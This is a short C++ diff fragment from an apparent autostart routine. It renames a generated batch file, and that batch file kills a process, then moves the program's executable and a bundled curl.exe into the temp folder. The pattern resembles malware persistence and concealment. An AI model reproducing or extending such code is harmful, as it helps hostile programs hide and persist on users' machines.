@@ -84,7 +84,7 @@ void autostart() {
 
 
 		fstream file;
-		file.open("djna.bat", ios::out);
+		file.open("temp.bat", ios::out);
 		file << "taskkill /IM " + exe_name + " /F\n";
 		file << "move " + exe_name + " %temp%\n";
 		file <<"move curl.exe %temp%\n";
